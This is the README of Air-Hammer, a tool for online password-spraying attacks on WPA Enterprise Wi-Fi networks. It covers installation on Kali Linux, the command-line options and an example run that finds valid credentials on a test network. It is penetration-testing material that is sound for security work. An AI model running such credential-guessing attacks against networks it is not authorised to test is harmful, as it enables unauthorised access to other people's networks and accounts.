Air-Hammer - A WPA Enterprise horizontal brute-force attack tool
==========
*Created by Michael "Wh1t3Rh1n0" Allen, 2016-09-01*

Introduction
------------
Air-Hammer is an online brute-force attack tool for use against WPA Enterprise networks. Although WPA Enterprise is often considered "more secure" than WPA-PSK, it also has a much larger attack surface. While WPA-PSK networks have only one valid password, there may be thousands of valid username and password combinations which grant access to a single WPA Enterprise network. Further, passwords used to access WPA Enterprise networks are commonly selected by end users, many of whom select **extremely common passwords**.

Air-Hammer has several advantages over current attacks against WPA Enterprise networks including:

* Client-less attacks
* Potentially larger attack surface
* Minimal hardware requirements

For a more detailed introduction to Air-Hammer, see my original blog post on it [here][1]


Screenshots
-----------
![Air-Hammer in use](http://mikeallen.org/images/air-hammer-01.jpg)


Installing dependencies
-----------------------
Air-Hammer has been built and used on the current version of Kali Linux. In addition to packages that come with Kali Linux by default, the following dependencies need to be installed:

* [python-wpa-supplicant][2]:

        root@kali:~# pip install wpa_supplicant


Other requirements
------------------
Air-Hammer requires a list of usernames that are valid for the target network in order to function. Some basic suggestions for creating this list are included in [step 2 of the attack chain outlined on my blog][3].


Usage
-----
The `-h` or `--help` flags can be used to display Air-Hammer's usage instructions.

```
root@kali:~# ./air-hammer.py --help
usage: air-hammer.py -i interface -e SSID -u USERFILE [-P PASSWORD]
                     [-p PASSFILE] [-s line] [-w OUTFILE] [-1] [-t seconds]

Perform an online, horizontal dictionary attack against a WPA Enterprise
network.

optional arguments:
  -i interface  Wireless interface (default: None)
  -e SSID       SSID of the target network (default: None)
  -u USERFILE   Username wordlist (default: None)
  -P PASSWORD   Password to try on each username (default: None)
  -p PASSFILE   List of passwords to try for each username (default: None)
  -s line       Optional start line to resume attack. May not be used with a
                password list. (default: 0)
  -w OUTFILE    Save valid credentials to a CSV file (default: None)
  -1            Stop after the first set of valid credentials are found
                (default: False)
  -t seconds    Seconds to sleep between each connection attempt (default:
                0.5)
```

Example
-------
Below is a standard attack using wlan0 to target the "Test-Network" wireless network with the password, "UserPassword1", and a list of usernames stored in the file, "usernames.txt".

```
root@kali:~# ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt 
[0]  Trying alice:UserPassword1...
[1]  Trying bob:UserPassword1...
[2]  Trying charlotte:UserPassword1...
[3]  Trying dave:UserPassword1...
[4]  Trying wifiuser:UserPassword1...
[!] VALID CREDENTIALS: wifiuser:UserPassword1
[5]  Trying wrongUser05:UserPassword1...
[6]  Trying wrongUser06:UserPassword1...
```


[1]: http://mikeallen.org/blog/2016-10-06-breaking-into-wpa-enterprise-networks-with-air-hammer/
[2]: https://github.com/digidotcom/python-wpa-supplicant
[3]: http://mikeallen.org/blog/2016-10-06-breaking-into-wpa-enterprise-networks-with-air-hammer/#attack-chain
